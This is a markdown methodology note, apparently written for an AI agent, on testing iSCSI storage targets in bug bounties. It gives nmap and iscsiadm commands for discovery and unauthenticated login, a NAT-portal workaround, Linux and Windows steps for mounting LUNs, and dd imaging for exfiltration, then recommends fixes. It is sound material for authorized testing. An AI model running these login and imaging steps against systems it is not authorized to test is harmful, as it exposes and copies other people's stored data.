---
technology: iSCSI
kind: bug-bounty-methodology
audience: ai-agent
status: upstream-only
family: storage
version: "1.0"
provenance: "upstream-only; zero corpus evidence by design — command surface grounded against the open-iscsi upstream project (iscsiadm discovery/node modes, node database layout, NAT portal guidance) and RFC 7143; the finding class is misconfiguration, not a CVE chain + rewritten from HackTricks (src/network-services-pentesting/3260-pentesting-iscsi.md), CC BY-NC 4.0, accessed 2026-11-13"
---

# iSCSI bug-bounty methodology

Companion overview: [[iscsi]].

Scope: TCP 3260 targets, the SendTargets discovery surface, unauthenticated or weak-CHAP LUN access, and the filesystem-level loot that follows a successful login. Sibling storage surfaces with their own units: [[nfs]].

## Phase 0 — Discovery and auth posture

```bash
nmap -sV --script iscsi-info -p 3260 198.51.100.10
```

`iscsi-info` reports target IQNs, portal group tags, and whether the portal demands authentication. For hands-on discovery, install the open-iscsi stack on the attacking host (`apt-get install open-iscsi`) and run the pre-auth SendTargets exchange:

```bash
iscsiadm -m discovery -t sendtargets -p 198.51.100.10:3260
# 198.51.100.10:3260,1 iqn.1992-05.com.emc:fl1001433000190000-3-vnxe
# [2001:db8::1]:3260,1 iqn.2000-01.com.example:target-1.d0280fd382
# 10.20.30.x:3260,1 iqn.2000-01.com.example:target-2.d0280fd382
```

Read the answer like recon, not like a menu: each line names a portal (possibly an internal address behind NAT — the `10.20.30.x` shape above) and an IQN whose reverse-DNS segment identifies the vendor. Internet-wide recon equivalent: a Shodan-style `port:3260` query with auth markers.

## Phase 1 — Login and credential attacks

Attempt the no-CHAP login first; success is the finding:

```bash
iscsiadm -m node --targetname 'iqn.2000-01.com.example:target-1' \
  --portal 198.51.100.10:3260 --login
```

If CHAP is required, credentials live in the node record (`node.session.auth.authmethod`, `.username`, `.password`, and the `_in` variants for mutual CHAP). Array-wide CHAP secrets are a legitimate credential-attack surface — treat them like any other shared service secret. Inspect the record discovery wrote (no `--login`/`--logout`) to confirm the negotiated parameters and portal wiring before acting on it.

## Phase 2 — The NAT portal trap

A SendTargets response may advertise a portal different from the address used for discovery — common behind NAT or a virtual IP. Open-iSCSI identifies a persistent node record by both target IQN and portal, so logging in against the unreachable advertised address fails. Create an explicit node record for the reachable portal instead:

```bash
iscsiadm -m node --op new \
  --targetname 'iqn.2000-01.com.example:target-1' \
  --portal 198.51.100.10:3260
iscsiadm -m node --targetname 'iqn.2000-01.com.example:target-1' \
  --portal 198.51.100.10:3260 --login
```

On initiator builds where an explicit record cannot be created, the legacy workaround edits the discovery-generated record under `/etc/iscsi/nodes/<iqn>/<advertised-portal>,3260,1/default`, pointing `node.conn[0].address` at the portal you can actually reach. Log out cleanly with `--logout` when finished; the LUN detaches with the session.

## Phase 3 — LUN loot (Linux)

After login the LUN is a local block device:

```bash
lsblk; lsscsi
mount -o ro,noload /dev/sdb1 /mnt/loot      # read-only; no journal replay
```

Read-only first, always: `noload` stops an ext3/4 journal replay that would write to a production LUN and can corrupt evidence. If the device holds LVM metadata, prefer read-only scanning over activation; note dm-crypt headers and move on rather than attacking them online.

Exfil as an image when the rules of engagement allow:

```bash
dd if=/dev/sdb of=lun-image.raw bs=4M status=progress
# offline: loop-mount, LVM metadata assembly, deleted-file carving
```

An image is also the safer loot primitive on a live assessment — carve it offline instead of holding the target LUN open.

## Phase 4 — LUN loot (Windows)

From a Windows foothold, the built-in initiator does the same job through the PowerShell iSCSI module:

```powershell
New-IscsiTargetPortal -TargetPortalAddress 198.51.100.10
Get-IscsiTarget
Connect-IscsiTarget -NodeAddress '<TARGET_IQN>' -IsPersistent $false
Get-IscsiSession
```

Apply the same read-only discipline before bringing discovered disks online, and disconnect cleanly at the end (`Disconnect-IscsiTarget -NodeAddress '<TARGET_IQN>' -Confirm:$false`). The classic GUI path (`iscsicpl.exe`) and the legacy `iscsicli` tool drive the same operations.

## Phase 5 — Reporting the fix

Require CHAP and prefer mutual CHAP; restrict target portal access to known initiator addresses on the array itself; keep 3260 off internet-facing interfaces; use IPsec or an isolated storage VLAN when confidentiality matters (the RFC's own guidance); and call out stale, snapshot, or DR LUNs exported by mistake as data exposures, because the block layer keeps everything the filesystem forgot.

## Appendix — tools in prose

`nmap` (iscsi-info NSE), `iscsiadm`/`iscsid` from open-iscsi, `lsblk`/`lsscsi` for device triage, `dd` or `ddrescue` for imaging, loop-mount and deleted-file carving tooling for offline work, the Windows iSCSI PowerShell module and `iscsicpl.exe`, `nc` for hand-rolled payloads, and Shodan-style service queries for exposure mapping.
